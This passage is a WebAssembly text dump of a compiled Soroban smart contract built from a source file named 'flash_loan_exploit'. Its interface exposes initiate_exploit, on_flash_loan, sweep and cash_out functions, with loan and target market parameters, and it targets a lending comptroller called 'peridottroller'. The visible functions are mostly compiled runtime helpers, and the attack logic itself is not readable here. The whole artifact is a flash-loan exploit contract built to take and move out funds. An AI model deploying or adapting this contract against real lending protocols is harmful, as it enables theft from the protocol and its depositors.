      i32.store offset=8
      local.get 0
      i32.const 0
      i32.store8 offset=4
      local.get 0
      i32.const 1
      i32.store
    end
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;120;) (type 30) (param i32 i32)
    (local i32)
    i32.const 1
    local.set 2
    block ;; label = @1
      local.get 1
      i32.const 255
      i32.and
      i32.const 95
      i32.eq
      br_if 0 (;@1;)
      block ;; label = @2
        block ;; label = @3
          local.get 1
          i32.const -48
          i32.add
          i32.const 255
          i32.and
          i32.const 10
          i32.lt_u
          br_if 0 (;@3;)
          local.get 1
          i32.const -65
          i32.add
          i32.const 255
          i32.and
          i32.const 26
          i32.lt_u
          br_if 1 (;@2;)
          block ;; label = @4
            local.get 1
            i32.const -97
            i32.add
            i32.const 255
            i32.and
            i32.const 26
            i32.lt_u
            br_if 0 (;@4;)
            local.get 0
            local.get 1
            i32.store8 offset=1
            local.get 0
            i32.const 1
            i32.store8
            return
          end
          local.get 1
          i32.const -59
          i32.add
          local.set 2
          br 2 (;@1;)
        end
        local.get 1
        i32.const -46
        i32.add
        local.set 2
        br 1 (;@1;)
      end
      local.get 1
      i32.const -53
      i32.add
      local.set 2
    end
    local.get 0
    i32.const 255
    i32.store8
    local.get 0
    local.get 2
    i32.store8 offset=1
  )
  (func (;121;) (type 31) (param i64) (result i32)
    local.get 0
    i64.const 32
    i64.shr_u
    i32.wrap_i64
  )
  (func (;122;) (type 31) (param i64) (result i32)
    local.get 0
    i64.const 1
    i64.eq
  )
  (func (;123;) (type 32) (param i32 i64)
    local.get 0
    i64.const 0
    i64.store offset=8
    local.get 0
    local.get 1
    i64.const 8
    i64.shr_u
    i64.store
  )
  (func (;124;) (type 32) (param i32 i64)
    local.get 0
    local.get 1
    i64.const 63
    i64.shr_s
    i64.store offset=8
    local.get 0
    local.get 1
    i64.const 8
    i64.shr_s
    i64.store
  )
  (func (;125;) (type 6) (result i64)
    i64.const 34359740419
  )
  (func (;126;) (type 33) (param i32 i64 i64)
    (local i64)
    i64.const 1
    local.set 3
    block ;; label = @1
      local.get 1
      i64.const 72057594037927935
      i64.gt_u
      local.get 2
      i64.const 0
      i64.ne
      local.get 2
      i64.eqz
      select
      br_if 0 (;@1;)
      local.get 0
      local.get 1
      i64.const 8
      i64.shl
      i64.const 10
      i64.or
      i64.store offset=8
      i64.const 0
      local.set 3
    end
    local.get 0
    local.get 3
    i64.store
  )
  (func (;127;) (type 33) (param i32 i64 i64)
    (local i64)
    i64.const 1
    local.set 3
    block ;; label = @1
      local.get 1
      i64.const 36028797018963968
      i64.add
      i64.const 72057594037927935
      i64.gt_u
      br_if 0 (;@1;)
      local.get 1
      local.get 1
      i64.xor
      local.get 2
      local.get 1
      i64.const 63
      i64.shr_s
      i64.xor
      i64.or
      i64.const 0
      i64.ne
      br_if 0 (;@1;)
      local.get 0
      local.get 1
      i64.const 8
      i64.shl
      i64.const 11
      i64.or
      i64.store offset=8
      i64.const 0
      local.set 3
    end
    local.get 0
    local.get 3
    i64.store
  )
  (func (;128;) (type 7) (param i32 i32 i32)
    local.get 0
    local.get 1
    i32.const 1
    i32.shl
    i32.const 1
    i32.or
    local.get 2
    call 130
    unreachable
  )
  (func (;129;) (type 0) (param i32 i32) (result i32)
    local.get 1
    local.get 0
    i32.load
    local.get 0
    i32.load offset=4
    call 132
  )
  (func (;130;) (type 7) (param i32 i32 i32)
    (local i32)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 1
    i32.store offset=16
    local.get 3
    local.get 0
    i32.store offset=12
    local.get 3
    i32.const 1
    i32.store16 offset=28
    local.get 3
    local.get 2
    i32.store offset=24
    local.get 3
    local.get 3
    i32.const 12
    i32.add
    i32.store offset=20
    local.get 3
    i32.const 20
    i32.add
    call 61
    unreachable
  )
  (func (;131;) (type 0) (param i32 i32) (result i32)
    (local i32 i32 i32 i32 i32 i32 i32 i32)
    block ;; label = @1
      block ;; label = @2
        local.get 1
        local.get 0
        i32.const 3
        i32.add
        i32.const -4
        i32.and
        local.tee 2
        local.get 0
        i32.sub
        local.tee 3
        i32.lt_u
        br_if 0 (;@2;)
        local.get 1
        local.get 3
        i32.sub
        local.tee 4
        i32.const 2
        i32.shr_u
        local.tee 5
        i32.eqz
        br_if 0 (;@2;)
        local.get 4
        i32.const 3
        i32.and
        local.set 6
        i32.const 0
        local.set 7
        i32.const 0
        local.set 1
        block ;; label = @3
          local.get 2
          local.get 0
          i32.eq
          br_if 0 (;@3;)
          i32.const 0
          local.set 8
          i32.const 0
          local.set 1
          block ;; label = @4
            local.get 0
            local.get 2
            i32.sub
            local.tee 9
            i32.const -4
            i32.gt_u
            br_if 0 (;@4;)
            i32.const 0
            local.set 8
            i32.const 0
            local.set 1
            loop ;; label = @5
              local.get 1
              local.get 0
              local.get 8
              i32.add
              local.tee 2
              i32.load8_s
              i32.const -65
              i32.gt_s
              i32.add
              local.get 2
              i32.const 1
              i32.add
              i32.load8_s
              i32.const -65
              i32.gt_s
              i32.add
              local.get 2
              i32.const 2
              i32.add
              i32.load8_s
              i32.const -65
              i32.gt_s
              i32.add
              local.get 2
              i32.const 3
              i32.add
              i32.load8_s
              i32.const -65
              i32.gt_s
              i32.add
              local.set 1
              local.get 8
              i32.const 4
              i32.add
              local.tee 8
              br_if 0 (;@5;)
            end
          end
          local.get 0
          local.get 8
          i32.add
          local.set 2
          loop ;; label = @4
            local.get 1
            local.get 2
            i32.load8_s
            i32.const -65
            i32.gt_s
            i32.add
            local.set 1
            local.get 2
            i32.const 1
            i32.add
            local.set 2
            local.get 9
            i32.const 1
            i32.add
            local.tee 9
            br_if 0 (;@4;)
          end
        end
        local.get 0
        local.get 3
        i32.add
        local.set 9
        block ;; label = @3
          local.get 6
          i32.eqz
          br_if 0 (;@3;)
          local.get 9
          local.get 4
          i32.const 2147483644
          i32.and
          i32.add
          local.tee 2
          i32.load8_s
          i32.const -65
          i32.gt_s
          local.set 7
          local.get 6
          i32.const 1
          i32.eq
          br_if 0 (;@3;)
          local.get 7
          local.get 2
          i32.load8_s offset=1
          i32.const -65
          i32.gt_s
          i32.add
          local.set 7
          local.get 6
          i32.const 2
          i32.eq
          br_if 0 (;@3;)
          local.get 7
          local.get 2
          i32.load8_s offset=2
          i32.const -65
          i32.gt_s
          i32.add
          local.set 7
        end
        local.get 7
        local.get 1
        i32.add
        local.set 8
        loop ;; label = @3
          local.get 9
          local.set 3
          local.get 5
          i32.eqz
          br_if 2 (;@1;)
          local.get 5
          i32.const 192
          local.get 5
          i32.const 192
          i32.lt_u
          select
          local.tee 7
          i32.const 3
          i32.and
          local.set 6
          block ;; label = @4
            block ;; label = @5
              local.get 7
              i32.const 2
              i32.shl
              local.tee 4
              i32.const 1008
              i32.and
              local.tee 1
              br_if 0 (;@5;)
              i32.const 0
              local.set 2
              br 1 (;@4;)
            end
            local.get 3
            local.get 1
            i32.add
            local.set 0
            i32.const 0
            local.set 2
            local.get 3
            local.set 1
            loop ;; label = @5
              local.get 1
              i32.const 12
              i32.add
              i32.load
              local.tee 9
              i32.const -1
              i32.xor
              i32.const 7
              i32.shr_u
              local.get 9
              i32.const 6
              i32.shr_u
              i32.or
              i32.const 16843009
              i32.and
              local.get 1
              i32.const 8
              i32.add
              i32.load
              local.tee 9
              i32.const -1
              i32.xor
              i32.const 7
              i32.shr_u
              local.get 9
              i32.const 6
              i32.shr_u
              i32.or
              i32.const 16843009
              i32.and
              local.get 1
              i32.const 4
              i32.add
              i32.load
              local.tee 9
              i32.const -1
              i32.xor
              i32.const 7
              i32.shr_u
              local.get 9
              i32.const 6
              i32.shr_u
              i32.or
              i32.const 16843009
              i32.and
              local.get 1
              i32.load
              local.tee 9
              i32.const -1
              i32.xor
              i32.const 7
              i32.shr_u
              local.get 9
              i32.const 6
              i32.shr_u
              i32.or
              i32.const 16843009
              i32.and
              local.get 2
              i32.add
              i32.add
              i32.add
              i32.add
              local.set 2
              local.get 1
              i32.const 16
              i32.add
              local.tee 1
              local.get 0
              i32.ne
              br_if 0 (;@5;)
            end
          end
          local.get 5
          local.get 7
          i32.sub
          local.set 5
          local.get 3
          local.get 4
          i32.add
          local.set 9
          local.get 2
          i32.const 8
          i32.shr_u
          i32.const 16711935
          i32.and
          local.get 2
          i32.const 16711935
          i32.and
          i32.add
          i32.const 65537
          i32.mul
          i32.const 16
          i32.shr_u
          local.get 8
          i32.add
          local.set 8
          local.get 6
          i32.eqz
          br_if 0 (;@3;)
        end
        local.get 3
        local.get 7
        i32.const 252
        i32.and
        i32.const 2
        i32.shl
        i32.add
        local.tee 2
        i32.load
        local.tee 1
        i32.const -1
        i32.xor
        i32.const 7
        i32.shr_u
        local.get 1
        i32.const 6
        i32.shr_u
        i32.or
        i32.const 16843009
        i32.and
        local.set 1
        block ;; label = @3
          local.get 6
          i32.const 1
          i32.eq
          br_if 0 (;@3;)
          local.get 2
          i32.load offset=4
          local.tee 9
          i32.const -1
          i32.xor
          i32.const 7
          i32.shr_u
          local.get 9
          i32.const 6
          i32.shr_u
          i32.or
          i32.const 16843009
          i32.and
          local.get 1
          i32.add
          local.set 1
          local.get 6
          i32.const 2
          i32.eq
          br_if 0 (;@3;)
          local.get 2
          i32.load offset=8
          local.tee 2
          i32.const -1
          i32.xor
          i32.const 7
          i32.shr_u
          local.get 2
          i32.const 6
          i32.shr_u
          i32.or
          i32.const 16843009
          i32.and
          local.get 1
          i32.add
          local.set 1
        end
        local.get 1
        i32.const 8
        i32.shr_u
        i32.const 459007
        i32.and
        local.get 1
        i32.const 16711935
        i32.and
        i32.add
        i32.const 65537
        i32.mul
        i32.const 16
        i32.shr_u
        local.get 8
        i32.add
        local.set 8
        br 1 (;@1;)
      end
      block ;; label = @2
        local.get 1
        br_if 0 (;@2;)
        i32.const 0
        return
      end
      local.get 1
      i32.const 3
      i32.and
      local.set 2
      i32.const 0
      local.set 9
      i32.const 0
      local.set 8
      block ;; label = @2
        local.get 1
        i32.const 4
        i32.lt_u
        br_if 0 (;@2;)
        local.get 1
        i32.const -4
        i32.and
        local.set 5
        i32.const 0
        local.set 8
        i32.const 0
        local.set 9
        loop ;; label = @3
          local.get 8
          local.get 0
          local.get 9
          i32.add
          local.tee 1
          i32.load8_s
          i32.const -65
          i32.gt_s
          i32.add
          local.get 1
          i32.const 1
          i32.add
          i32.load8_s
          i32.const -65
          i32.gt_s
          i32.add
          local.get 1
          i32.const 2
          i32.add
          i32.load8_s
          i32.const -65
          i32.gt_s
          i32.add
          local.get 1
          i32.const 3
          i32.add
          i32.load8_s
          i32.const -65
          i32.gt_s
          i32.add
          local.set 8
          local.get 5
          local.get 9
          i32.const 4
          i32.add
          local.tee 9
          i32.ne
          br_if 0 (;@3;)
        end
        local.get 2
        i32.eqz
        br_if 1 (;@1;)
      end
      local.get 0
      local.get 9
      i32.add
      local.set 1
      loop ;; label = @2
        local.get 8
        local.get 1
        i32.load8_s
        i32.const -65
        i32.gt_s
        i32.add
        local.set 8
        local.get 1
        i32.const 1
        i32.add
        local.set 1
        local.get 2
        i32.const -1
        i32.add
        local.tee 2
        br_if 0 (;@2;)
      end
    end
    local.get 8
  )
  (func (;132;) (type 1) (param i32 i32 i32) (result i32)
    (local i32 i32 i32 i32 i32 i32 i32)
    block ;; label = @1
      block ;; label = @2
        local.get 0
        i32.load offset=8
        local.tee 3
        i32.const 402653184
        i32.and
        i32.eqz
        br_if 0 (;@2;)
        block ;; label = @3
          block ;; label = @4
            block ;; label = @5
              block ;; label = @6
                block ;; label = @7
                  local.get 3
                  i32.const 268435456
                  i32.and
                  i32.eqz
                  br_if 0 (;@7;)
                  local.get 0
                  i32.load16_u offset=14
                  local.tee 4
                  br_if 1 (;@6;)
                  i32.const 0
                  local.set 2
                  br 2 (;@5;)
                end
                block ;; label = @7
                  local.get 2
                  i32.const 16
                  i32.lt_u
                  br_if 0 (;@7;)
                  local.get 1
                  local.get 2
                  call 131
                  local.set 5
                  br 4 (;@3;)
                end
                block ;; label = @7
                  local.get 2
                  br_if 0 (;@7;)
                  i32.const 0
                  local.set 5
                  br 4 (;@3;)
                end
                local.get 2
                i32.const 3
                i32.and
                local.set 6
                i32.const 0
                local.set 7
                i32.const 0
                local.set 5
                block ;; label = @7
                  local.get 2
                  i32.const 4
                  i32.lt_u
                  br_if 0 (;@7;)
                  local.get 2
                  i32.const 12
                  i32.and
                  local.set 4
                  i32.const 0
                  local.set 5
                  i32.const 0
                  local.set 7
                  loop ;; label = @8
                    local.get 5
                    local.get 1
                    local.get 7
                    i32.add
                    local.tee 8
                    i32.load8_s
                    i32.const -65
                    i32.gt_s
                    i32.add
                    local.get 8
                    i32.const 1
                    i32.add
                    i32.load8_s
                    i32.const -65
                    i32.gt_s
                    i32.add
                    local.get 8
                    i32.const 2
                    i32.add
                    i32.load8_s
                    i32.const -65
                    i32.gt_s
                    i32.add
                    local.get 8
                    i32.const 3
                    i32.add
                    i32.load8_s
                    i32.const -65
                    i32.gt_s
                    i32.add
                    local.set 5
                    local.get 4
                    local.get 7
                    i32.const 4
                    i32.add
                    local.tee 7
                    i32.ne
                    br_if 0 (;@8;)
                  end
                  local.get 6
                  i32.eqz
                  br_if 4 (;@3;)
                end
                local.get 1
                local.get 7
                i32.add
                local.set 8
                loop ;; label = @7
                  local.get 5
                  local.get 8
                  i32.load8_s
                  i32.const -65
                  i32.gt_s
                  i32.add
                  local.set 5
                  local.get 8
                  i32.const 1
                  i32.add
                  local.set 8
                  local.get 6
                  i32.const -1
                  i32.add
                  local.tee 6
                  br_if 0 (;@7;)
                  br 4 (;@3;)
                end
              end
              local.get 1
              local.get 2
              i32.add
              local.set 7
              i32.const 0
              local.set 2
              local.get 1
              local.set 8
              local.get 4
              local.set 6
              loop ;; label = @6
                local.get 8
                local.tee 5
                local.get 7
                i32.eq
                br_if 2 (;@4;)
                block ;; label = @7
                  block ;; label = @8
                    local.get 5
                    i32.load8_s
                    local.tee 8
                    i32.const -1
                    i32.le_s
                    br_if 0 (;@8;)
                    local.get 5
                    i32.const 1
                    i32.add
                    local.set 8
                    br 1 (;@7;)
                  end
                  block ;; label = @8
                    local.get 8
                    i32.const -32
                    i32.ge_u
                    br_if 0 (;@8;)
                    local.get 5
                    i32.const 2
                    i32.add
                    local.set 8
                    br 1 (;@7;)
                  end
                  local.get 5
                  i32.const 4
                  i32.const 3
                  local.get 8
                  i32.const -17
                  i32.gt_u
                  select
                  i32.add
                  local.set 8
                end
                local.get 8
                local.get 5
                i32.sub
                local.get 2
                i32.add
                local.set 2
                local.get 6
                i32.const -1
                i32.add
                local.tee 6
                br_if 0 (;@6;)
              end
            end
            i32.const 0
            local.set 6
          end
          local.get 4
          local.get 6
          i32.sub
          local.set 5
        end
        local.get 5
        local.get 0
        i32.load16_u offset=12
        local.tee 8
        i32.ge_u
        br_if 0 (;@2;)
        local.get 8
        local.get 5
        i32.sub
        local.set 9
        i32.const 0
        local.set 5
        i32.const 0
        local.set 4
        block ;; label = @3
          block ;; label = @4
            block ;; label = @5
              local.get 3
              i32.const 29
              i32.shr_u
              i32.const 3
              i32.and
              br_table 2 (;@3;) 0 (;@5;) 1 (;@4;) 2 (;@3;) 2 (;@3;)
            end
            local.get 9
            local.set 4
            br 1 (;@3;)
          end
          local.get 9
          i32.const 65534
          i32.and
          i32.const 1
          i32.shr_u
          local.set 4
        end
        local.get 3
        i32.const 2097151
        i32.and
        local.set 7
        local.get 0
        i32.load offset=4
        local.set 6
        local.get 0
        i32.load
        local.set 0
        block ;; label = @3
          loop ;; label = @4
            local.get 5
            i32.const 65535
            i32.and
            local.get 4
            i32.const 65535
            i32.and
            i32.ge_u
            br_if 1 (;@3;)
            i32.const 1
            local.set 8
            local.get 5
            i32.const 1
            i32.add
            local.set 5
            local.get 0
            local.get 7
            local.get 6
            i32.load offset=16
            call_indirect (type 0)
            br_if 3 (;@1;)
            br 0 (;@4;)
          end
        end
        i32.const 1
        local.set 8
        local.get 0
        local.get 1
        local.get 2
        local.get 6
        i32.load offset=12
        call_indirect (type 1)
        br_if 1 (;@1;)
        i32.const 0
        local.set 5
        local.get 9
        local.get 4
        i32.sub
        i32.const 65535
        i32.and
        local.set 2
        loop ;; label = @3
          local.get 5
          i32.const 65535
          i32.and
          local.tee 4
          local.get 2
          i32.lt_u
          local.set 8
          local.get 4
          local.get 2
          i32.ge_u
          br_if 2 (;@1;)
          local.get 5
          i32.const 1
          i32.add
          local.set 5
          local.get 0
          local.get 7
          local.get 6
          i32.load offset=16
          call_indirect (type 0)
          br_if 2 (;@1;)
          br 0 (;@3;)
        end
      end
      local.get 0
      i32.load
      local.get 1
      local.get 2
      local.get 0
      i32.load offset=4
      i32.load offset=12
      call_indirect (type 1)
      local.set 8
    end
    local.get 8
  )
  (func (;133;) (type 1) (param i32 i32 i32) (result i32)
    local.get 0
    i32.load
    local.get 1
    local.get 2
    local.get 0
    i32.load offset=4
    i32.load offset=12
    call_indirect (type 1)
  )
  (func (;134;) (type 19) (param i32)
    i32.const 1049183
    i32.const 43
    local.get 0
    call 128
    unreachable
  )
  (func (;135;) (type 16) (param i32 i32 i32 i32 i32)
    (local i32)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 5
    global.set 0
    local.get 5
    local.get 1
    i32.store offset=4
    local.get 5
    local.get 0
    i32.store
    local.get 5
    local.get 3
    i32.store offset=12
    local.get 5
    local.get 2
    i32.store offset=8
    local.get 5
    i32.const 3
    i64.extend_i32_u
    i64.const 32
    i64.shl
    local.get 5
    i32.const 8
    i32.add
    i64.extend_i32_u
    i64.or
    i64.store offset=24
    local.get 5
    i32.const 4
    i64.extend_i32_u
    i64.const 32
    i64.shl
    local.get 5
    i64.extend_i32_u
    i64.or
    i64.store offset=16
    i32.const 1048680
    local.get 5
    i32.const 16
    i32.add
    local.get 4
    call 130
    unreachable
  )
  (func (;136;) (type 0) (param i32 i32) (result i32)
    local.get 0
    i32.load
    local.get 1
    local.get 0
    i32.load offset=4
    i32.load offset=12
    call_indirect (type 0)
  )
  (func (;137;) (type 19) (param i32)
    i32.const 1049226
    i32.const 57
    local.get 0
    call 130
    unreachable
  )
  (func (;138;) (type 1) (param i32 i32 i32) (result i32)
    (local i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32)
    global.get 0
    i32.const 16
    i32.sub
    local.set 3
    block ;; label = @1
      block ;; label = @2
        local.get 2
        i32.const 16
        i32.ge_u
        br_if 0 (;@2;)
        local.get 0
        local.set 4
        br 1 (;@1;)
      end
      block ;; label = @2
        local.get 0
        local.get 0
        i32.const 0
        local.get 0
        i32.sub
        i32.const 3
        i32.and
        local.tee 5
        i32.add
        local.tee 6
        i32.ge_u
        br_if 0 (;@2;)
        local.get 5
        i32.const -1
        i32.add
        local.set 7
        local.get 0
        local.set 4
        local.get 1
        local.set 8
        block ;; label = @3
          local.get 5
          i32.eqz
          br_if 0 (;@3;)
          local.get 5
          local.set 9
          local.get 0
          local.set 4
          local.get 1
          local.set 8
          loop ;; label = @4
            local.get 4
            local.get 8
            i32.load8_u
            i32.store8
            local.get 8
            i32.const 1
            i32.add
            local.set 8
            local.get 4
            i32.const 1
            i32.add
            local.set 4
            local.get 9
            i32.const -1
            i32.add
            local.tee 9
            br_if 0 (;@4;)
          end
        end
        local.get 7
        i32.const 7
        i32.lt_u
        br_if 0 (;@2;)
        loop ;; label = @3
          local.get 4
          local.get 8
          i32.load8_u
          i32.store8
          local.get 4
          i32.const 1
          i32.add
          local.get 8
          i32.const 1
          i32.add
          i32.load8_u
          i32.store8
          local.get 4
          i32.const 2
          i32.add
          local.get 8
          i32.const 2
          i32.add
          i32.load8_u
          i32.store8
          local.get 4
          i32.const 3
          i32.add
          local.get 8
          i32.const 3
          i32.add
          i32.load8_u
          i32.store8
          local.get 4
          i32.const 4
          i32.add
          local.get 8
          i32.const 4
          i32.add
          i32.load8_u
          i32.store8
          local.get 4
          i32.const 5
          i32.add
          local.get 8
          i32.const 5
          i32.add
          i32.load8_u
          i32.store8
          local.get 4
          i32.const 6
          i32.add
          local.get 8
          i32.const 6
          i32.add
          i32.load8_u
          i32.store8
          local.get 4
          i32.const 7
          i32.add
          local.get 8
          i32.const 7
          i32.add
          i32.load8_u
          i32.store8
          local.get 8
          i32.const 8
          i32.add
          local.set 8
          local.get 4
          i32.const 8
          i32.add
          local.tee 4
          local.get 6
          i32.ne
          br_if 0 (;@3;)
        end
      end
      local.get 6
      local.get 2
      local.get 5
      i32.sub
      local.tee 10
      i32.const -4
      i32.and
      local.tee 11
      i32.add
      local.set 4
      block ;; label = @2
        block ;; label = @3
          local.get 1
          local.get 5
          i32.add
          local.tee 12
          i32.const 3
          i32.and
          local.tee 7
          br_if 0 (;@3;)
          local.get 6
          local.get 4
          i32.ge_u
          br_if 1 (;@2;)
          local.get 12
          local.set 1
          loop ;; label = @4
            local.get 6
            local.get 1
            i32.load
            i32.store
            local.get 1
            i32.const 4
            i32.add
            local.set 1
            local.get 6
            i32.const 4
            i32.add
            local.tee 6
            local.get 4
            i32.lt_u
            br_if 0 (;@4;)
            br 2 (;@2;)
          end
        end
        i32.const 0
        local.set 1
        local.get 3
        i32.const 0
        i32.store offset=12
        local.get 3
        i32.const 12
        i32.add
        local.get 7
        i32.or
        local.set 8
        block ;; label = @3
          i32.const 4
          local.get 7
          i32.sub
          local.tee 9
          i32.const 1
          i32.and
          i32.eqz
          br_if 0 (;@3;)
          local.get 8
          local.get 12
          i32.load8_u
          i32.store8
          i32.const 1
          local.set 1
        end
        block ;; label = @3
          local.get 9
          i32.const 2
          i32.and
          i32.eqz
          br_if 0 (;@3;)
          local.get 8
          local.get 1
          i32.add
          local.get 12
          local.get 1
          i32.add
          i32.load16_u
          i32.store16
        end
        local.get 12
        local.get 7
        i32.sub
        local.set 8
        local.get 7
        i32.const 3
        i32.shl
        local.set 2
        local.get 3
        i32.load offset=12
        local.set 9
        block ;; label = @3
          local.get 6
          i32.const 4
          i32.add
          local.get 4
          i32.ge_u
          br_if 0 (;@3;)
          i32.const 0
          local.get 2
          i32.sub
          i32.const 24
          i32.and
          local.set 5
          loop ;; label = @4
            local.get 6
            local.tee 1
            local.get 9
            local.get 2
            i32.shr_u
            local.get 8
            i32.const 4
            i32.add
            local.tee 8
            i32.load
            local.tee 9
            local.get 5
            i32.shl
            i32.or
            i32.store
            local.get 1
            i32.const 4
            i32.add
            local.set 6
            local.get 1
            i32.const 8
            i32.add
            local.get 4
            i32.lt_u
            br_if 0 (;@4;)
          end
        end
        i32.const 0
        local.set 1
        local.get 3
        i32.const 0
        i32.store8 offset=8
        local.get 3
        i32.const 0
        i32.store8 offset=6
        block ;; label = @3
          block ;; label = @4
            local.get 7
            i32.const 1
            i32.ne
            br_if 0 (;@4;)
            local.get 3
            i32.const 8
            i32.add
            local.set 13
            i32.const 0
            local.set 5
            i32.const 0
            local.set 7
            i32.const 0
            local.set 14
            br 1 (;@3;)
          end
          local.get 8
          i32.const 5
          i32.add
          i32.load8_u
          local.set 7
          local.get 3
          local.get 8
          i32.const 4
          i32.add
          i32.load8_u
          local.tee 5
          i32.store8 offset=8
          local.get 7
          i32.const 8
          i32.shl
          local.set 7
          i32.const 2
          local.set 14
          local.get 3
          i32.const 6
          i32.add
          local.set 13
        end
        block ;; label = @3
          local.get 12
          i32.const 1
          i32.and
          i32.eqz
          br_if 0 (;@3;)
          local.get 13
          local.get 8
          i32.const 4
          i32.add
          local.get 14
          i32.add
          i32.load8_u
          i32.store8
          local.get 3
          i32.load8_u offset=6
          i32.const 16
          i32.shl
          local.set 1
          local.get 3
          i32.load8_u offset=8
          local.set 5
        end
        local.get 6
        local.get 7
        local.get 1
        i32.or
        local.get 5
        i32.const 255
        i32.and
        i32.or
        i32.const 0
        local.get 2
        i32.sub
        i32.const 24
        i32.and
        i32.shl
        local.get 9
        local.get 2
        i32.shr_u
        i32.or
        i32.store
      end
      local.get 10
      i32.const 3
      i32.and
      local.set 2
      local.get 12
      local.get 11
      i32.add
      local.set 1
    end
    block ;; label = @1
      local.get 4
      local.get 4
      local.get 2
      i32.add
      local.tee 6
      i32.ge_u
      br_if 0 (;@1;)
      local.get 2
      i32.const -1
      i32.add
      local.set 9
      block ;; label = @2
        local.get 2
        i32.const 7
        i32.and
        local.tee 8
        i32.eqz
        br_if 0 (;@2;)
        loop ;; label = @3
          local.get 4
          local.get 1
          i32.load8_u
          i32.store8
          local.get 1
          i32.const 1
          i32.add
          local.set 1
          local.get 4
          i32.const 1
          i32.add
          local.set 4
          local.get 8
          i32.const -1
          i32.add
          local.tee 8
          br_if 0 (;@3;)
        end
      end
      local.get 9
      i32.const 7
      i32.lt_u
      br_if 0 (;@1;)
      loop ;; label = @2
        local.get 4
        local.get 1
        i32.load8_u
        i32.store8
        local.get 4
        i32.const 1
        i32.add
        local.get 1
        i32.const 1
        i32.add
        i32.load8_u
        i32.store8
        local.get 4
        i32.const 2
        i32.add
        local.get 1
        i32.const 2
        i32.add
        i32.load8_u
        i32.store8
        local.get 4
        i32.const 3
        i32.add
        local.get 1
        i32.const 3
        i32.add
        i32.load8_u
        i32.store8
        local.get 4
        i32.const 4
        i32.add
        local.get 1
        i32.const 4
        i32.add
        i32.load8_u
        i32.store8
        local.get 4
        i32.const 5
        i32.add
        local.get 1
        i32.const 5
        i32.add
        i32.load8_u
        i32.store8
        local.get 4
        i32.const 6
        i32.add
        local.get 1
        i32.const 6
        i32.add
        i32.load8_u
        i32.store8
        local.get 4
        i32.const 7
        i32.add
        local.get 1
        i32.const 7
        i32.add
        i32.load8_u
        i32.store8
        local.get 1
        i32.const 8
        i32.add
        local.set 1
        local.get 4
        i32.const 8
        i32.add
        local.tee 4
        local.get 6
        i32.ne
        br_if 0 (;@2;)
      end
    end
    local.get 0
  )
  (func (;139;) (type 1) (param i32 i32 i32) (result i32)
    local.get 0
    local.get 1
    local.get 2
    call 138
  )
  (data (;0;) (i32.const 1048576) "\0e\b7\ba\e2\b3y\e7\00\00\00\00\00\00\00\00\00\01\00\00\00\01\00\00\00called `Result::unwrap()` on an `Err` valueflash_loan\00\00\00\0e*:\9b\b1y\02\00\0e\bcy\a7m\ee\f2\00\0ejn\a6\aen\bb1\c0\02: \c0\00/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/soroban-sdk-25.3.2/src/env.rs\00contracts/flash_loan_exploit/src/lib.rs\00\00\c7\00\10\00'\00\00\00T\00\00\00M\00\00\00\c7\00\10\00'\00\00\00U\00\00\00A\00\00\00\c7\00\10\00'\00\00\00^\00\00\00m\00\00\00\c7\00\10\00'\00\00\00n\00\00\00L\00\00\00borrow_amountborrowerloan_marketloan_tokenrepay_amounttarget_markettarget_token\000\01\10\00\0d\00\00\00=\01\10\00\08\00\00\00E\01\10\00\0b\00\00\00P\01\10\00\0a\00\00\00Z\01\10\00\0c\00\00\00f\01\10\00\0d\00\00\00s\01\10\00\0c\00\00\00ConversionErrorConfig\00\00\00\c7\01\10\00\06\00\00\00peridottroller\00\00\d8\01\10\00\0e\00\00\00n\00\10\00X\00\00\00\95\01\00\00\0e\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\02\00\00\00called `Result::unwrap()` on an `Err` value\00\00\00\00\00\0e\eaN\dfum\02\00\0e*:\9b\b1y\02\00ConversionErrorcalled `Option::unwrap()` on a `None` valueattempt to add with overflow")
  (@custom "contractspecv0" (after data) "\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\06Config\00\00\00\00\00\01\00\00\00\00\00\00\00\0eperidottroller\00\00\00\00\00\13\00\00\00\02\00\00\00\00\00\00\00\00\00\00\00\07DataKey\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\06Config\00\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\0bExploitData\00\00\00\00\07\00\00\00\00\00\00\00\0dborrow_amount\00\00\00\00\00\00\0a\00\00\00\00\00\00\00\08borrower\00\00\00\13\00\00\00\00\00\00\00\0bloan_market\00\00\00\00\13\00\00\00\00\00\00\00\0aloan_token\00\00\00\00\00\13\00\00\00\00\00\00\00\0crepay_amount\00\00\00\0a\00\00\00\00\00\00\00\0dtarget_market\00\00\00\00\00\00\13\00\00\00\00\00\00\00\0ctarget_token\00\00\00\13\00\00\00\00\00\00\00\00\00\00\00\04init\00\00\00\01\00\00\00\00\00\00\00\0eperidottroller\00\00\00\00\00\13\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\05sweep\00\00\00\00\00\00\02\00\00\00\00\00\00\00\05token\00\00\00\00\00\00\13\00\00\00\00\00\00\00\02to\00\00\00\00\00\13\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08cash_out\00\00\00\01\00\00\00\00\00\00\00\05vault\00\00\00\00\00\00\13\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0don_flash_loan\00\00\00\00\00\00\04\00\00\00\00\00\00\00\09initiator\00\00\00\00\00\00\13\00\00\00\00\00\00\00\06amount\00\00\00\00\00\0a\00\00\00\00\00\00\00\03fee\00\00\00\00\0a\00\00\00\00\00\00\00\04data\00\00\00\0e\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10initiate_exploit\00\00\00\08\00\00\00\00\00\00\00\0bloan_market\00\00\00\00\13\00\00\00\00\00\00\00\0aloan_token\00\00\00\00\00\13\00\00\00\00\00\00\00\0bloan_amount\00\00\00\00\0a\00\00\00\00\00\00\00\0dtarget_market\00\00\00\00\00\00\13\00\00\00\00\00\00\00\0ctarget_token\00\00\00\13\00\00\00\00\00\00\00\0dborrow_amount\00\00\00\00\00\00\0a\00\00\00\00\00\00\00\08borrower\00\00\00\13\00\00\00\00\00\00\00\0crepay_amount\00\00\00\0a\00\00\00\00")
